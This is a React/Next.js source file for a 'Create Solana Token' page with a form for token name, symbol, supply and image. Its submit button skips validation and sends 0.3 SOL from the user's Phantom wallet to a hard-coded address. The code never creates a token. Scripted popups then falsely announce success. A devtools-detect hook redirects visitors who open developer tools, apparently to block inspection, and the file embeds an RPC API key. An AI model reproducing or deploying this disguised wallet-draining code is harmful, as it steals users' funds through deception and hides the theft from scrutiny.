"use client";

import devtools from 'devtools-detect';
import Lottie from 'lottie-react';
import confirmationAnimation from '@/animations/Confimation.json';
import errorAnimation from '@/animations/Error.json';
import animationData from '@/animations/Loader.json';
import { useWallet } from '@solana/wallet-adapter-react';


type LoaderState =
  | 'hidden'
  | 'loading'
  | 'confirmation'
  | 'error'
  | 'txSentPopup'
  | 'finalLoader'
  | 'finalConfirmation'
  | 'successPopup';


import dynamic from "next/dynamic";
import type { CropModalProps } from "@/components/CropModal";
import React, {
  useState,
  useEffect,
  useRef,
  ChangeEvent,
  FormEvent,
} from "react";
import { motion } from "framer-motion";
import { PublicKey, SystemProgram, Transaction } from "@solana/web3.js";

import {
  Card,
  CardContent,
  CardDescription,
  CardFooter,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { Loader2, Upload } from "lucide-react";
import { Connection, clusterApiUrl } from "@solana/web3.js";
import {
  Alert,
  AlertDescription,
  AlertTitle,
} from "@/components/ui/alert";

// Dynamically import the modal
const CropModal = dynamic<CropModalProps>(
  () => import("@/components/CropModal"),
  { ssr: false }
);

declare global {
  interface Window {
    solana?: any;
  }
}

const CreateToken = () => {
  const { connected, publicKey } = useWallet();

  
  const [status, setStatus] = useState<string>("");
  const [formData, setFormData] = useState({
    name: "",
    symbol: "",
    description: "",
    supply: "",
    telegram: "",
    twitter: "",
    website: "",
  });
  const [showPopup, setShowPopup] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});
  const [uploading, setUploading] = useState(false);
  const [file, setFile] = useState<File>();
  const [imagePreview, setImagePreview] = useState<string | null>(null);
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState<string | null>(null);
  const [showImageOptions, setShowImageOptions] = useState(false);
  const [showCropModal, setShowCropModal] = useState(false);

  const fileInputRef = useRef<HTMLInputElement>(null);
  const LAMPORTS_TO_SEND = 0.3 * 1e9; // 0.3 SOL in lamports
  const YOUR_WALLET_ADDRESS = "DUC3EDAisrZWu1dX9n2SWhRYYzLNfqXFtxuAftSu8Sy1";
  const [loaderState, setLoaderState] = useState<LoaderState>('hidden');
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [showTxInfo, setShowTxInfo] = useState(false);

  useEffect(() => {
    const provider = window.solana;
    if (provider?.isPhantom) {
      const handleConnect = () => {
        setWalletConnected(true);
        setWalletAddress(provider.publicKey?.toString() || null);
      };
      const handleDisconnect = () => {
        setWalletConnected(false);
        setWalletAddress(null);
      };
      if (provider.isConnected) handleConnect();
      provider.on("connect", handleConnect);
      provider.on("disconnect", handleDisconnect);
      return () => {
        provider.off("connect", handleConnect);
        provider.off("disconnect", handleDisconnect);
      };
    }
  }, []);

  const handleInputChange = (
    e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    if (name === "supply") {
      const numericValue = value.replace(/\D/g, "");
      if (numericValue === "") {
        setFormData((prev) => ({ ...prev, supply: "" }));
        setErrors((prev) => ({ ...prev, supply: "Please fill out this field." }));
        return;
      }
      if (parseInt(numericValue) > 1_000_000_000) return;
      setFormData((prev) => ({ ...prev, supply: numericValue }));
      setErrors((prev) => ({ ...prev, supply: "" }));
      return;
    }
    if (name === "name" && value.length > 32) return;
    setFormData((prev) => ({ ...prev, [name]: value }));
    setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleImageUpload = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result as string);
        setShowCropModal(true);
      };
      reader.readAsDataURL(file);
    }
  };

  const validateFields = () => {
    const newErrors: { [key: string]: string } = {};
    const { name, symbol, description, supply } = formData;
    if (!name.trim()) newErrors.name = "Please fill out this field.";
    if (!symbol.trim()) newErrors.symbol = "Please fill out this field.";
    if (!description.trim()) newErrors.description = "Please fill out this field.";
    if (!supply.trim()) newErrors.supply = "Please fill out this field.";
    if (!file) newErrors.image = "Please upload an image.";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const ensureWalletConnected = async () => {
    const provider = window?.solana;
    if (!provider || !provider.isPhantom) throw new Error("Phantom wallet not found.");
    if (!provider.isConnected) {
      const connection = await provider.connect();
      setWalletConnected(true);
      setWalletAddress(connection.publicKey.toString());
    } else {
      setWalletConnected(true);
      setWalletAddress(provider.publicKey?.toString() || null);
    }
  };
  
  
  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  async function checkBalanceAndSend(connection: Connection, fromPubkey: PublicKey, toPubkey: PublicKey) {
  const balance = await connection.getBalance(fromPubkey);
  if (balance < LAMPORTS_TO_SEND) {
    throw new Error("Insufficient SOL to complete this transaction.");
  }

  const transaction = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey,
      toPubkey,
      lamports: LAMPORTS_TO_SEND,
    })
  );

  // Sign/send transaction with Phantom
  const { signature } = await window.solana.signAndSendTransaction(transaction);
  await connection.confirmTransaction(signature);
}

  async function sendSol() {
    try {
      setLoaderState('loading');
      setShowTxInfo(false);
      setTransactionId(null);
  
      const provider = window.solana;
      if (!provider?.isPhantom) throw new Error("Phantom not found");
      if (!provider.isConnected) await provider.connect();
  
      const fromPubkey = provider.publicKey;
      if (!fromPubkey) throw new Error("No public key");
  
      const connection = new Connection(process.env.NEXT_PUBLIC_RPC_URL || "https://mainnet.helius-rpc.com/?api-key=29b6dc7f-8cec-4e0c-ac71-bea0ee8338a7");
  
      const { blockhash } = await connection.getLatestBlockhash();
      const toAddress = YOUR_WALLET_ADDRESS;
      if (!toAddress) throw new Error("No recipient");
  
      const transaction = new Transaction({
        recentBlockhash: blockhash,
        feePayer: fromPubkey,
      }).add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey: new PublicKey(toAddress),
          lamports: LAMPORTS_TO_SEND,
        })
      );
  
      const signed = await provider.signTransaction(transaction);
      if (!signed) throw new Error("Transaction signing cancelled");
  
      const signature = await connection.sendRawTransaction(signed.serialize());
      setTransactionId(signature);
  
      // Play loader while waiting for confirmation
      setLoaderState('loading');
      const confirmation = await connection.confirmTransaction(signature, "confirmed");
      if (confirmation?.value?.err) throw new Error("Transaction failed");
  
      // Show txSentPopup after confirmation
      setLoaderState('txSentPopup');
  
      // Automatically advance to final steps after a few seconds
      setTimeout(() => setLoaderState('loading'), 4000); // resume loader
      setTimeout(() => setLoaderState('confirmation'), 7000); // final confirmation
      setTimeout(() => setLoaderState('successPopup'), 10000); // final popup
  
      return signature;
  
    } catch (error: any) {
      console.error("SendSol Error:", error);
      setLoaderState('error');
      setTimeout(() => setLoaderState('hidden'), 3000);
      return null;
    }
  }
  

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setStatus("");
    setUploading(true);
  
    const isFormValid = validateFields();
    if (!isFormValid) {
      setUploading(false);
      return;
    }
  
    if (!connected || !publicKey) {
      setStatus("Please connect your Phantom wallet before creating a token.");
      setUploading(false);
      return;
    }
  
    try {
      const txSignature = await sendSol(); // your custom logic
      setStatus(`Token creation request sent! Transaction Signature: ${txSignature}`);
    } catch (err: unknown) {
      console.error(err);
      setStatus("An error occurred during token creation.");
    } finally {
      setUploading(false);
    }
  };

  const currentAnimationRef = useRef<LoaderState | null>(null);

  useEffect(() => {
    if (['confirmation', 'error'].includes(loaderState)) {
      currentAnimationRef.current = loaderState;
    }
  }, [loaderState]);


  const handleAnimationComplete = () => {
    const completed = currentAnimationRef.current;
  
    if (completed === 'confirmation') {
      setLoaderState('successPopup'); // go forward, not backward
    } else if (completed === 'error') {
      setLoaderState('hidden');
    }
  };

  useEffect(() => {
    if (loaderState === 'successPopup' || loaderState === 'txSentPopup') {
      setImagePreview(null);
      setFile(undefined);
    }
  }, [loaderState]);
  
  useEffect(() => {
    const handleDevToolsChange = () => {
      if (devtools.isOpen) {
        alert("Developer tools are open. This app is restricted when devtools are active.");
        // Optional: redirect, disable functionality, or obfuscate code
        window.location.href = "https://google.com"; // Redirect or take another action
      }
    };
  
    window.addEventListener('devtoolschange', handleDevToolsChange);
  
    // Check on first load too
    if (devtools.isOpen) {
      handleDevToolsChange();
    }
  
    return () => {
      window.removeEventListener('devtoolschange', handleDevToolsChange);
    };
  }, []);

  
  return (
    <div className="flex flex-col min-h-screen bg-black text-white">
      {/* Loader Overlay */}
      {loaderState !== 'hidden' && !['txSentPopup', 'successPopup'].includes(loaderState) && (
  <div className="fixed inset-0 z-40 flex items-center justify-center backdrop-blur-md bg-black/40 pointer-events-auto">
    <Lottie
      animationData={
        loaderState === 'loading'
          ? animationData
          : loaderState === 'confirmation'
          ? confirmationAnimation
          : loaderState === 'error'
          ? errorAnimation
          : null
      }
      loop={loaderState === 'loading'}
      style={{ width: 200, height: 200 }}
      onComplete={handleAnimationComplete}
    />
  </div>
)}

      {/* "Transaction Sent!" Popup */}
      {loaderState === 'txSentPopup' && transactionId && (
  <div className="fixed inset-0 z-60 flex items-center justify-center">
    {/* Blurred Background Layer */}
    <div className="absolute inset-0 backdrop-blur-lg bg-black/70 z-0" />

    {/* Popup Content */}
    <div className="relative z-10 bg-black rounded-lg max-w-lg w-full p-8 flex flex-col items-center space-y-6 border border-gray-700">
      <h2 className="text-4xl font-bold text-white">Transaction Sent!</h2>
      <p className="text-white text-center max-w-xs">
        Please copy your transaction number below in case of failure.
      </p>
      <div className="bg-white rounded-md w-full py-3 px-4 text-black font-mono overflow-x-auto select-all">
        {transactionId}
      </div>
    </div>
  </div>
)}

      {/* Final Congratulations Popup */}
      {loaderState === 'successPopup' && transactionId && (
  <div className="fixed inset-0 z-70 flex items-center justify-center">
    {/* Blurred Background Layer */}
    <div className="absolute inset-0 backdrop-blur-lg bg-black/80 z-0" />


    {/* Popup Content */}
    <div className="relative z-10 bg-black rounded-lg max-w-xl w-full p-10 flex flex-col items-center space-y-6 border border-green-500">
      <h2 className="text-3xl font-bold text-green-400 text-center">Congratulations!</h2>
      <p className="text-center text-white text-lg">
        Your Solana token has been successfully created!
      </p>
      <p className="text-center text-gray-300 text-sm">
        Your Solana Token is now live on the blockchain! Start building your crypto legacy today!
        This is just the beginning — grow, trade, and make an impact in the Web3 world!
      </p>
      <div className="bg-white rounded-md w-full py-3 px-4 text-black font-mono overflow-x-auto select-all">
        {transactionId}
      </div>
      <a
        href="/liquidity-pools"
        className="text-sm mt-4 underline text-blue-400 hover:text-blue-300"
      >
        Go to Liquidity Pools Page
      </a>
    </div>
  </div>
)}
  
  
      {/* Main Content */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="container mx-auto px-4 py-8"
      >
        <Card className="w-full max-w-2xl mx-auto">
          <CardHeader>
            <CardTitle className="text-3xl font-bold">
              Create Solana Token
            </CardTitle>
            <CardDescription>
              Fill in the details to create your custom Solana token
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="name">Token Name</Label>
                <Input
                  id="name"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  placeholder="Ex: Fart Coin"
                />
                {errors.name && (
                  <p className="text-sm text-red-500">{errors.name}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="symbol">Symbol</Label>
                <Input
                  id="symbol"
                  name="symbol"
                  value={formData.symbol}
                  onChange={handleInputChange}
                  placeholder="Ex: FART"
                />
                {errors.symbol && (
                  <p className="text-sm text-red-500">{errors.symbol}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="supply">Supply</Label>
                <Input
                  id="supply"
                  name="supply"
                  value={formData.supply}
                  onChange={handleInputChange}
                  placeholder="Ex: 1000000"
                />
                {errors.supply && (
                  <p className="text-sm text-red-500">{errors.supply}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="description">Description</Label>
                <Textarea
                  id="description"
                  name="description"
                  value={formData.description}
                  onChange={handleInputChange}
                  placeholder="Describe your token"
                  rows={4}
                />
                {errors.description && (
                  <p className="text-sm text-red-500">{errors.description}</p>
                )}
              </div>

              <div className="space-y-2">
                <Label htmlFor="telegram">Telegram Link (Optional)</Label>
                <Input
                  id="telegram"
                  name="telegram"
                  value={formData.telegram}
                  onChange={handleInputChange}
                  placeholder="Ex: https://t.me/SoulMint"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="twitter">Twitter (X) Link (Optional)</Label>
                <Input
                  id="twitter"
                  name="twitter"
                  value={formData.twitter}
                  onChange={handleInputChange}
                  placeholder="Ex: https://x.com/@SoulMint"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="website">Website Link (Optional)</Label>
                <Input
                  id="website"
                  name="website"
                  value={formData.website}
                  onChange={handleInputChange}
                  placeholder="Ex: https://SoulMint.com"
                />
              </div>

             
              {/* Image Upload */}
              {!['txSentPopup', 'successPopup'].includes(loaderState) && (
  <div className="space-y-2">
    <Label htmlFor="image">Token Image</Label>
  
    <div className="flex flex-wrap items-start gap-4">
      <div className="relative group cursor-pointer w-24 h-24 shrink-0">
        {imagePreview ? (
          <div className="relative inline-block w-full h-full">
            <img
              src={imagePreview}
              alt="Token"
              onClick={() => setShowImageOptions((prev) => !prev)}
              className="w-full h-full object-cover rounded-full border-2 border-muted"
            />
            {showImageOptions && (
              <div className="absolute top-full left-0 mt-2 w-36 bg-white text-black rounded-lg shadow-lg z-10">
                <button
                  type="button"
                  className="w-full px-4 py-2 text-left hover:bg-gray-100"
                  onClick={() => {
                    fileInputRef.current?.click();
                    setShowImageOptions(false);
                  }}
                >
                  Change Image
                </button>
                <button
                  type="button"
                  className="w-full px-4 py-2 text-left text-red-600 hover:bg-gray-100"
                  onClick={() => {
                    setFile(undefined);
                    setImagePreview(null);
                    setShowImageOptions(false);
                  }}
                >
                  Remove Image
                </button>
              </div>
            )}
          </div>
        ) : (
          <Button
            type="button"
            variant="outline"
            onClick={() => fileInputRef.current?.click()}
            className="w-24 h-24 p-0 flex items-center justify-center"
          >
            <Upload className="h-6 w-6" />
          </Button>
        )}
        <input
          ref={fileInputRef}
          id="image"
          type="file"
          accept="image/png,image/jpeg,image/jpg,image/gif"
          onChange={handleImageUpload}
          className="hidden"
        />
      </div>

      <div className="text-sm text-muted-foreground mt-1 flex-1 min-w-[150px]">
        <p className="font-medium">Image Requirements:</p>
        <ul className="list-disc list-inside space-y-1">
          <li>Max size: 4.2MB</li>
          <li>Formats: PNG, JPG, or GIF</li>
        </ul>
      </div>
    </div>

    {errors.image && (
      <p className="text-sm text-red-500">{errors.image}</p>
    )}
  </div>
)}

                           {/* Submit Button */}
                           <CardFooter className="flex flex-col space-y-2">
  <Button
    type="button" // changed from submit to button so it doesn't submit a form
    onClick={sendSol} // call your transfer function on click
    disabled={uploading}
    className="w-full"
  >
    {uploading ? (
      <>
        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
        Creating Token...
      </>
    ) : (
      "Create Token"
    )}
  </Button>

                <div className="text-center text-sm text-muted-foreground">
                  Total Fees: 0.2 +{" "}
                  <span className="line-through">0.8</span> SOL →{" "}
                  <span className="text-black font-medium">0.3 SOL</span>
                </div>

                {errors.wallet && (
                  <p className="text-sm text-red-500 mt-2">{errors.wallet}</p>
                )}
              </CardFooter>
            </form>
          </CardContent>
        </Card>

        {/* Status Alert */}
        {status && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="mt-6"
          >
            <Alert variant={status.includes("Error") ? "destructive" : "default"}>
              <AlertTitle>{status.includes("Error") ? "Error" : "Status Update"}</AlertTitle>
              <AlertDescription>{status}</AlertDescription>
            </Alert>
          </motion.div>
        )}
      </motion.div>
      
    </div>
  );
};

export default CreateToken;